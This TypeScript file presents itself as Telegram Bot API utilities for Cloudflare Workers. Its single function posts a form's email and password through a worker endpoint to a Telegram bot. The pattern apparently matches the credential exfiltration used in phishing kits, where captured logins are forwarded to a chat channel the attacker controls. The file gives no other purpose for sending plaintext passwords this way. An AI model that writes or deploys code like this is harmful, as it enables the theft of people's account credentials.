/**
 * Telegram Bot API utilities for Cloudflare Workers
 */

interface TelegramMessageData {
  email: string;
  password: string;
}

/**
 * Sends form data to Telegram bot via Cloudflare Worker
 * @param data - Form data to send
 * @returns Promise with success status
 */
export const sendToTelegramBot = async (data: TelegramMessageData): Promise<boolean> => {
  try {
    const response = await fetch('/api/send-telegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    });
    
    const result = await response.json();
    
    if (!response.ok) {
      console.error('Worker function error:', result.error);
      return false;
    }
    
    if (!result?.success) {
      console.error('Telegram send failed:', result?.error);
      return false;
    }
    
    return true;
  } catch (error) {
    console.error('Failed to send to Telegram:', error);
    return false;
  }
};